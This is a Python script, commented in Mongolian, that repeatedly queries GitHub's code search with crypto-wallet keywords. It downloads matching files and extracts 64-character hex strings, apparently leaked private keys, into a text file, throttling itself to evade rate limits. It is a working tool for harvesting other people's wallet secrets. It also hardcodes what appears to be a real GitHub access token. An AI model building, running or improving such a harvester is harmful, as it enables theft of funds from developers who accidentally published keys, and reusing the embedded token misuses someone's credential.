import requests
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import random
from threading import Thread

# GITHUB TOKEN (Environment variable-аас уншина, байхгүй бол fallback)
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "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")

headers = {
    "Authorization": f"Bearer {GITHUB_TOKEN}",
    "Accept": "application/vnd.github+json"
}

# Railway Persistent Volume зам (Локал байвал desktop эсвэл одоогийн фолдерт хадгална)
if os.path.exists("/data"):
    GITHUB_TXT_PATH = "/data/github.txt"
else:
    GITHUB_TXT_PATH = "github.txt"

GITHUB_SCANNER_RUNNING = False

def process_single_file(item):
    """Нэг файлыг татаж аваад 64 оронтой код байгаа эсэхийг шалгах функц"""
    file_url = item.get("html_url", "")
    repo_name = item.get("repository", {}).get("full_name", "")
    
    raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
    
    try:
        file_res = requests.get(raw_url, headers=headers, timeout=5)
        if file_res.status_code == 200:
            code_content = file_res.text
            
            crypto_keywords = ["private", "hex", "wallet", "crypto", "key", "secret", "mnemonic", "account"]
            if not any(sub in code_content.lower() for sub in crypto_keywords):
                return None

            matches = re.findall(r'\b[a-fA-F0-9]{64}\b', code_content)
            
            if matches:
                found = []
                for match in matches:
                    found.append((match, repo_name, file_url))
                return found
    except Exception:
        pass
    return None

def save_to_file(tokens):
    try:
        existing = set()
        if os.path.exists(GITHUB_TXT_PATH):
            with open(GITHUB_TXT_PATH, "r", encoding="utf-8") as f:
                for line in f:
                    existing.add(line.strip())

        new_count = 0
        with open(GITHUB_TXT_PATH, "a", encoding="utf-8") as f:
            for token in tokens:
                if token not in existing:
                    f.write(f"{token}\n")
                    new_count += 1

        if new_count > 0:
            print(f"✅ Шинээр {new_count} ширхэг кодыг {GITHUB_TXT_PATH} руу амжилттай хадгаллаа.")
    except OSError as e:
        print(f"Файл хадгалах алдаа: {e}")

def run_github_search():
    global GITHUB_SCANNER_RUNNING
    keywords = [
        "secp256k1", "eth_private_key", "btc_private_key", "wallet_private",
        "ecdsa_private_key", "signing_key", "master_key", "private_key",
        "secret_key", "hex_key", "ethereum_private", "crypto_wallet",
        'mnemonic = "', "bip39", "hdwallet", "wif =", "wallet.dat",
        "keystore.json", "eth.accounts.privateKeyToAccount", "Account.from_key"
    ]
    
    url = "https://api.github.com/search/code"
    
    while GITHUB_SCANNER_RUNNING:
        for keyword in keywords:
            if not GITHUB_SCANNER_RUNNING:
                break
            print(f"\n🔍 Хайж байна: '{keyword}'...")
            
            for lang in ["python", "javascript", "env", "txt", "typescript", "json"]:
                if not GITHUB_SCANNER_RUNNING:
                    break
                query = f'{keyword} language:{lang}'
                available_pages = list(range(1, 21))
                selected_pages = random.sample(available_pages, 4)
                selected_pages.sort()

                for page in selected_pages:
                    if not GITHUB_SCANNER_RUNNING:
                        break
                    params = {
                        "q": query,
                        "per_page": 100,
                        "page": page
                    }

                    try:
                        sleep_time = random.uniform(3.0, 5.0)
                        time.sleep(sleep_time)

                        response = requests.get(url, headers=headers, params=params, timeout=15)

                        if response.status_code == 200:
                            items = response.json().get("items", [])
                            if not items:
                                continue
                            
                            found_tokens = set()
                            with ThreadPoolExecutor(max_workers=25) as executor:
                                futures = {executor.submit(process_single_file, item): item for item in items}
                                for future in as_completed(futures):
                                    result = future.result()
                                    if result:
                                        for match, repo_name, file_url in result:
                                            print(f"   🎯 АМЖИЛТТАЙ! Олдлоо -> Repo: {repo_name} | Код: {match}")
                                            found_tokens.add(match)
                            
                            if found_tokens:
                                save_to_file(found_tokens)

                        elif response.status_code == 403:
                            print("❌ Rate limit хэтэрсэн байна. 30 секунд түр хүлээнэ үү...")
                            time.sleep(30)
                        else:
                            break
                    except requests.RequestException as e:
                        print(f"Сүлжээний алдаа: {e}")
        
        # Бүх keyword-уудаар хайж дуусаад түр хүлээгээд дахин эхэлнэ
        time.sleep(10)

def start_scanner():
    global GITHUB_SCANNER_RUNNING
    if not GITHUB_SCANNER_RUNNING:
        GITHUB_SCANNER_RUNNING = True
        Thread(target=run_github_search, daemon=True).start()
        return "🚀 GitHub 64-Key Scanner амжилттай эхэллээ!"
    return "⚠️ Scanner аль хэдийн ажиллаж байна."

def stop_scanner():
    global GITHUB_SCANNER_RUNNING
    GITHUB_SCANNER_RUNNING = False
    return "🛑 GitHub 64-Key Scanner зогслоо."

def get_tokens_text():
    if os.path.exists(GITHUB_TXT_PATH):
        with open(GITHUB_TXT_PATH, "r", encoding="utf-8") as f:
            return f.read()
    return "Одоогоор ямар нэгэн GitHub 64-key олдсонгүй (Файл хоосон байна)."
